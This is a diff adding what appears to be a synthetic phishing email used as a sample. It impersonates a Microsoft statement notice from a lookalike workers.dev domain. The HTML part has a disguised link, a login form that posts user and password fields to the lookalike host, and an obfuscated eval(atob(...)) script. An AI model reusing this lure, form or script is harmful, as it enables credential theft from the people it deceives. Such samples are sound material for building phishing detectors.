@@ -1,0 +1,30 @@
+From: notice@microsoft-sso.workers.dev
+To: victim52@example.com
+Subject: Monthly statement available [ref U464868]
+Date: Tue, 19 Mar 2002 06:08:00 -0500
+Message-ID: <phish-232-372c511e-d9e5-4807-8aec-90f23c672213@microsoft-sso.workers.dev>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 26 Mar 2002 23:48:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 18 Mar 2002 08:06:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 12 Mar 2002 14:58:00 -0500
+Return-Path: <notice@microsoft-sso.workers.dev>
+Reply-To: notice@microsoft-sso.workers.dev
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=microsoft-sso.workers.dev; dkim=pass header.d=microsoft-sso.workers.dev; dmarc=pass header.from=microsoft-sso.workers.dev
+Received-SPF: pass (mx.example.com: domain of notice@microsoft-sso.workers.dev designates 192.0.2.52 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=microsoft-sso.workers.dev; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-232-65d5ea32"
+
+--bnd-p-232-65d5ea32
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+Your monthly statement is ready. Open the link below.
+https://microsoft-sso.workers.dev/statement/U464868
+
+Reference: U464868
+--bnd-p-232-65d5ea32
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>Your monthly statement is ready. Open the link below.<br/>https://microsoft-sso.workers.dev/statement/U464868<br/><br/>Reference: U464868</p><p><a href="http://microsoft-sso.workers.dev/login">https://www.microsoft.com/signin</a></p><form action="http://microsoft-sso.workers.dev/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-232-65d5ea32--
